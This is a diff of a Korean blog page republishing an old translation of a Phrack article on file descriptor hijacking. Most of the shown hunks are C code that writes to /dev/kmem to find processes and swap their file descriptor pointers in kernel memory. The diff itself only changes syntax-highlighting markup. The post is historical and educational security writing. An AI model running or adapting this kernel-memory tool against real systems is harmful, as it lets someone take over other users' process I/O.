@@ -1,13 +1,12 @@
-<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>YJ Blog/posts/translate/phrack-magazine/vol7-issue51-fd-hijacking/</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/terminal-0.7.1.min.css><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/animate-3.7.2.min.css><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/console.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
-<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><meta property="og:title" content="Phrack magazine Vol7 Issue51 File Descriptor Hijacking"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="https://blog.younjinjeong.io/posts/translate/phrack-magazine/vol7-issue51-fd-hijacking/"><meta property="article:published_time" content="2021-03-07T16:21:21+08:00"><meta name=twitter:title content="Phrack magazine Vol7 Issue51 File Descriptor Hijacking"><meta name=twitter:description content="블로그 테스트용으로 올려보는 예전 번역 10년전 KHDP에서 번역했었던
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>YJ Blog/posts/translate/phrack-magazine/vol7-issue51-fd-hijacking/</title>
+<meta name=description content="Younjin Jeong's Blog"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/terminal-0.7.1.min.css><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/animate-3.7.2.min.css><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/console.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><meta property="og:title" content="Phrack magazine Vol7 Issue51 File Descriptor Hijacking"><meta property="og:description" content="Younjin Jeong's Blog"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.younjinjeong.io/posts/translate/phrack-magazine/vol7-issue51-fd-hijacking/"><meta property="article:published_time" content="2021-03-07T16:21:21+08:00"><meta name=twitter:title content="Phrack magazine Vol7 Issue51 File Descriptor Hijacking"><meta name=twitter:description content="블로그 테스트용으로 올려보는 예전 번역 10년전 KHDP에서 번역했었던
 File descriptor hijacking 에 대한 글이 생각나
 구글링을 해 보았더니, 수정없이 그냥들 보고 있는게 많더라.
 사실, FD Hijacking 정도 볼 것 같으면
 고딩의 저 어설픈 번역을 수정 할 법도 한데 그냥들 보고 있다는 말이지 홀홀..
 10년이 지난 지금, 아직도 저런 공격방법이 통할 지는 모르겠지만
 그 시절, 열정만을 가지고 밤새워 번역하고 코드 테스트도 해보며
-이땅에 리눅스 및 BSD가 창궐하기전 홀로 즐겼던 세상으로 다시 돌아가 본다."><script async src="https://www.googletagmanager.com/gtag/js?id=G-LF5W12M5RW"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LF5W12M5RW",{anonymize_ip:!1})}</script><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/xterm.css><script type=text/javascript src=https://blog.younjinjeong.io/hugo-theme-console/js/lib/jquery-3.1.1.slim.js></script><body class=terminal><div class=container><h1><a href=https://blog.younjinjeong.io/>Distribution Complete blog</a></h1><div class=terminal-nav><header class=terminal-logo><div class="logo terminal-prompt"><a href=https://blog.younjinjeong.io/ class=no-style>YJ Blog</a>:~#
+이땅에 리눅스 및 BSD가 창궐하기전 홀로 즐겼던 세상으로 다시 돌아가 본다."><script async src="https://www.googletagmanager.com/gtag/js?id=G-LF5W12M5RW"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LF5W12M5RW",{anonymize_ip:!1})}</script><link rel=stylesheet href=https://blog.younjinjeong.io/hugo-theme-console/css/xterm.css><script type=text/javascript src=https://blog.younjinjeong.io/hugo-theme-console/js/lib/jquery-3.1.1.slim.js></script><body class=terminal><div class=container><h1><a href=https://blog.younjinjeong.io/>Distribution Complete blog</a></h1><div class=terminal-nav><header class=terminal-logo><div class="logo terminal-prompt"><a href=https://blog.younjinjeong.io/ class=no-style>YJ Blog</a>:~#
 <a href=https://blog.younjinjeong.io/posts>posts</a>/<a href=https://blog.younjinjeong.io/posts/translate>translate</a>/<a href=https://blog.younjinjeong.io/posts/translate/phrack-magazine>phrack-magazine</a>/<a href=https://blog.younjinjeong.io/posts/translate/phrack-magazine/vol7-issue51-fd-hijacking>vol7-issue51-fd-hijacking</a>/</div></header><nav class=terminal-menu><ul vocab="https://schema.org/" typeof="BreadcrumbList"></ul></nav></div></div></body></head><body class=terminal><div class=container></div><div class=container><h1>Phrack magazine Vol7 Issue51 File Descriptor Hijacking</h1>Mar. 7, 2021<br><br><h3 id=블로그-테스트용으로-올려보는-예전-번역>블로그 테스트용으로 올려보는 예전 번역</h3><p>10년전 KHDP에서 번역했었던<br>File descriptor hijacking 에 대한 글이 생각나<br>구글링을 해 보았더니, 수정없이 그냥들 보고 있는게 많더라.</p><p>사실, FD Hijacking 정도 볼 것 같으면<br>고딩의 저 어설픈 번역을 수정 할 법도 한데 그냥들 보고 있다는 말이지 홀홀..</p><p>10년이 지난 지금, 아직도 저런 공격방법이 통할 지는 모르겠지만</p><p>그 시절, 열정만을 가지고 밤새워 번역하고 코드 테스트도 해보며<br>이땅에 리눅스 및 BSD가 창궐하기전 홀로 즐겼던 세상으로 다시 돌아가 본다.</p><p>그때가 그립다. 순수했고, 열정적이었던 열 여덟살&mldr;.<br>그 열정으로 서른 살을 살았더라면, 난 지금 무엇이 되어 있었을까.</p><p><strong>근데 이제 벌써 마흔</strong></p><p>어릴때 번역한거라 굉장히 허접스러우므로&mldr; 시간 되면 한번 다시 손보는 걸로. ㅋ</p><h3 id=시작>시작</h3><p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[ Pearls Of Wisdom ]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
 Procrastination is the denial of death.
 Lift with your leg, not your back.
@@ -159,48 +158,48 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>readval</span>(<span style=color:#66d9ef>int</span> ad) {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> val, r;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (lseek(kfd, ad, SEEK_SET) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    perror(<span style=color:#e6db74>&#34;lseek&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((r <span style=color:#f92672>=</span> read(kfd, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>lseek</span>(kfd, ad, SEEK_SET) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;lseek&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((r <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(kfd, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>) {
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>      perror(<span style=color:#e6db74>&#34;read&#34;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> fprintf(stderr, <span style=color:#e6db74>&#34;Error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;read&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> val;
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>readvalz</span>(<span style=color:#66d9ef>int</span> ad) {
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> r <span style=color:#f92672>=</span> readval(ad);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> r <span style=color:#f92672>=</span> <span style=color:#a6e22e>readval</span>(ad);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;NULL pointer found (fd not open?)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;NULL pointer found (fd not open?)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> r;
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>writeval</span>(<span style=color:#66d9ef>int</span> ad, <span style=color:#66d9ef>int</span> val) {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> w;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (lseek(kfd, ad, SEEK_SET) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    perror(<span style=color:#e6db74>&#34;lseek&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((w <span style=color:#f92672>=</span> write(kfd, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>lseek</span>(kfd, ad, SEEK_SET) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;lseek&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((w <span style=color:#f92672>=</span> <span style=color:#a6e22e>write</span>(kfd, <span style=color:#f92672>&amp;</span>val, <span style=color:#ae81ff>4</span>)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>) {
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (w <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>      perror(<span style=color:#e6db74>&#34;write&#34;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> fprintf(stderr, <span style=color:#e6db74>&#34;Error writing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;write&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Error writing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readtask</span>(<span style=color:#66d9ef>int</span> ad) {
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> r;
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (lseek(kfd, ad, SEEK_SET)<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    perror(<span style=color:#e6db74>&#34;lseek&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((r <span style=color:#f92672>=</span> read(kfd, <span style=color:#f92672>&amp;</span>ts, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> task_struct))) <span style=color:#f92672>!=</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>lseek</span>(kfd, ad, SEEK_SET)<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;lseek&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ((r <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(kfd, <span style=color:#f92672>&amp;</span>ts, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> task_struct))) <span style=color:#f92672>!=</span>
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> task_struct)) {
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>      perror(<span style=color:#e6db74>&#34;read&#34;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> fprintf(stderr, <span style=color:#e6db74>&#34;Error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;read&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Error reading...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>}
 </span></span><span style=display:flex><span>
@@ -209,10 +208,10 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (adr<span style=color:#f92672>=</span>TASK; ; adr<span style=color:#f92672>+=</span><span style=color:#ae81ff>4</span>) {
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (adr <span style=color:#f92672>&gt;=</span> TASK <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>NR_TASKS)
-</span></span><span style=display:flex><span>      fprintf(stderr, <span style=color:#e6db74>&#34;Process not found</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>    taskp <span style=color:#f92672>=</span> readval(adr);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Process not found</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    taskp <span style=color:#f92672>=</span> <span style=color:#a6e22e>readval</span>(adr);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>taskp) <span style=color:#66d9ef>continue</span>;
-</span></span><span style=display:flex><span>    readtask(taskp);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>readtask</span>(taskp);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ts.pid <span style=color:#f92672>==</span> pid) <span style=color:#66d9ef>break</span>;
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>}
@@ -222,59 +221,59 @@ fd 3을 쓰고 있다는것을 알아 냈을때.</p><p>그렇다면,</p><div cla
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> three<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>7</span>)
-</span></span><span style=display:flex><span>    fprintf(stderr, <span style=color:#e6db74>&#34;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]), 
-</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;Use: %s pid1 fd1 pid2 fd2 [pid3 fd3]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]), 
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  pid1 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>1</span>]), fd1 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>2</span>]);
-</span></span><span style=display:flex><span>  pid2 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>3</span>]), fd2 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>4</span>]);
+</span></span><span style=display:flex><span>  pid1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>1</span>]), fd1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>  pid2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>3</span>]), fd2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>4</span>]);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>==</span> <span style=color:#ae81ff>7</span>)
-</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>5</span>]), fd3 <span style=color:#f92672>=</span> atoi(argv[<span style=color:#ae81ff>6</span>]), three<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>5</span>]), fd3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>6</span>]), three<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>;
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pid1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid1 <span style=color:#f92672>=</span> getpid(), fd1 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (pid2 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid2 <span style=color:#f92672>=</span> getpid(), fd2 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three <span style=color:#f92672>&amp;&amp;</span> pid3 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> getpid(), fd3 <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    pid3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>getpid</span>(), fd3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/null&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  kfd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/dev/kmem&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>  kfd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/kmem&#34;</span>, O_RDWR);
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (kfd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
-</span></span><span style=display:flex><span>    perror(<span style=color:#e6db74>&#34;open&#34;</span>), exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;open&#34;</span>), <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  findtask(pid1);
-</span></span><span style=display:flex><span>  ad1 <span style=color:#f92672>=</span> AD(fd1);
-</span></span><span style=display:flex><span>  val1 <span style=color:#f92672>=</span> readvalz(ad1);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Found fd pointer 1, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val1, ad1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>findtask</span>(pid1);
+</span></span><span style=display:flex><span>  ad1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd1);
+</span></span><span style=display:flex><span>  val1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad1);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 1, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val1, ad1);
 </span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>  findtask(pid2);
-</span></span><span style=display:flex><span>  ad2 <span style=color:#f92672>=</span> AD(fd2);
-</span></span><span style=display:flex><span>  val2 <span style=color:#f92672>=</span> readvalz(ad2);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Found fd pointer 2, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val2, ad2);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>findtask</span>(pid2);
+</span></span><span style=display:flex><span>  ad2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd2);
+</span></span><span style=display:flex><span>  val2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad2);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 2, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val2, ad2);
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three) {
-</span></span><span style=display:flex><span>    findtask(pid3);
-</span></span><span style=display:flex><span>    ad3 <span style=color:#f92672>=</span> AD(fd3);
-</span></span><span style=display:flex><span>    val3 <span style=color:#f92672>=</span> readvalz(ad3);
-</span></span><span style=display:flex><span>    printf(<span style=color:#e6db74>&#34;Found fd pointer 3, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val3, ad3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>findtask</span>(pid3);
+</span></span><span style=display:flex><span>    ad3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>AD</span>(fd3);
+</span></span><span style=display:flex><span>    val3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>readvalz</span>(ad3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found fd pointer 3, value %.8x, stored at %.8x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val3, ad3);
 </span></span><span style=display:flex><span>  }
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (three) {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (readval(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> readval(ad2)<span style=color:#f92672>!=</span>val2 <span style=color:#f92672>||</span> readval(ad3)<span style=color:#f92672>!=</span>val3) {
-</span></span><span style=display:flex><span>      fprintf(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>      exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>readval</span>(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad2)<span style=color:#f92672>!=</span>val2 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad3)<span style=color:#f92672>!=</span>val3) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fprintf</span>(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
 </span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    writeval(ad2, val1);
-</span></span><span style=display:flex><span>    writeval(ad3, val2);
-</span></span><span style=display:flex><span>    writeval(ad1, val3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad2, val1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad3, val2);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>writeval</span>(ad1, val3);
 </span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (readval(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> readval(ad2)<span style=color:#f92672>!=</span>val2) {
-</span></span><span style=display:flex><span>      fprintf(stderr, <span style=color:#e6db74>&#34;fds changed in memory while using them - try again</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span>      exit(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>readval</span>(ad1)<span style=color:#f92672>!=</span>val1 <span style=color:#f92672>||</span> <span style=color:#a6e22e>readval</span>(ad2)<span style=color:#f92672>!=</span>val2) {
